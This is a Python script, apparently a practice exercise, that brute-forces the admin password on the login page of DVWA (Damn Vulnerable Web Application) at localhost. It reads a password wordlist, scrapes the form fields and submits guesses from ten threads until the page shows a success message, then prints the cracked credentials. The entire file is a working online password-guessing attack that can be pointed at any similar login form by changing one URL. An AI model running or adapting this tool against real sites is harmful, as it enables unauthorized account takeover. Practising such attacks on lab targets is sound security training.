from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to the password protected area admin'
TARGET = 'http://localhost/DVWA/vulnerabilities/brute'
WORDLIST = './resources/cain-and-abel.txt'


def get_words():
    with open(WORDLIST) as t:
        words = t.readlines()
    words_queue = Queue()
    for word in words:
        word = word.strip('\n')
        words_queue.put(word)
    print("Finished get_words...")
    return words_queue


def get_params(html):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(html), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value')
    return params


class Bruter:
    def __init__(self, username, url) -> None:
        self.threads_flag = False
        self.username = username
        self.url = url
        self.passwords = get_words()
        print("Finished Bruter.__init__...")


    def run(self):
        threads=[]
        for _ in range(10):
            thread = threading.Thread(target=self.web_bruter)
            thread.start()
            threads.append(thread)
        for t in threads:
            t.join()
        print("Finished Bruter.run...")


    def web_bruter(self):
        session = requests.Session()
        response = session.get(self.url)
        params = get_params(response.content)
#
        params['username'] = self.username
        while not self.passwords.empty() and not self.threads_flag:
            #time.sleep(2)
            password = self.passwords.get()
#
            params['password'] = password
###
            #GET or POST
            response = session.get(self.url+f"/?username={params.get('username')}&password={params.get('password')}&Login={params.get('Login')}")
            #response = session.post(self.url, data=params)
#
            if SUCCESS in response.content.decode():
                self.threads_flag = True
                print("\nHack Success!")
                print(f"Username is {self.username}")
                print(f'Password is {password}')
                print("DONE! Now cleaning up other threads...")
            else:
                sys.stdout.write('.')
                sys.stdout.flush()


if __name__ == "__main__":
    print("Start Hacking...")
    bruter = Bruter('admin', TARGET)
    bruter.run()
